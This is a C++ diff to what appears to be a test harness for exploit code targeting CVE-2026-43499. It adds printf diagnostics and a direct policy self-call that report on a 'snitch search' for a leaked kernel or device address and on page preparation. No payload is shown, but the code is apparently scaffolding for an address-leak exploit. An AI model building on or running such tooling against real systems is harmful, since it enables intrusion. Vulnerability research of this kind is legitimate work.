@@ -28,6 +28,7 @@ namespace {
     using ghostlock::backend::cve_2026_43499::leak::MapResult;
     using ghostlock::backend::cve_2026_43499::leak::RegionInputs;
     using ghostlock::backend::cve_2026_43499::leak::run_snitch_search;
+    using ghostlock::backend::cve_2026_43499::leak::run_verdict_name;
     using ghostlock::backend::cve_2026_43499::leak::ScanRange;
     using ghostlock::backend::cve_2026_43499::leak::ScanStrides;
     using ghostlock::backend::cve_2026_43499::leak::SnitchPatience;
@@ -164,8 +165,19 @@ int main() {
     waiting.max_attempts = 1U;
     waiting.poll_rounds = 4U;
 
+    /* Decisive measurement: run the policy directly first, and say what it did. */
+    const bool self_started = policy.start(2U);
+    std::printf("  self-call: started=%d ran=%d status=%s rounds=%u wanted=%zu region=%p\n",
+                self_started ? 1 : 0, policy.ran ? 1 : 0, run_verdict_name(policy.outcome.status),
+                policy.outcome.rounds, policy.outcome.pokes_wanted, policy.outcome.region);
+    policy.reset();
     const auto prepared = prepare_page<DeviceSeam, SnitchPolicy<DeviceSeam, StubBuckets>>(
         inputs, geometry, waiting, policy);
+    std::printf("  policy:  ran=%d has=%d addr=%llx outcome=%s rounds=%u probes=%zu wanted=%zu region=%p\n",
+                policy.ran ? 1 : 0, policy.has_collision() ? 1 : 0,
+                static_cast<unsigned long long>(policy.address()),
+                ghostlock::backend::cve_2026_43499::leak::run_verdict_name(policy.outcome.status),
+                policy.outcome.rounds, policy.outcome.probes, policy.outcome.pokes_wanted, policy.outcome.region);
     std::printf("  search:  started=%d collision=%d address=%llx\n", policy.ran ? 1 : 0,
                 policy.has_collision() ? 1 : 0, static_cast<unsigned long long>(policy.address()));
     std::printf("  prepare: status=%s at=%d opened=%zu closed=%zu base=%llx errno=%d\n",
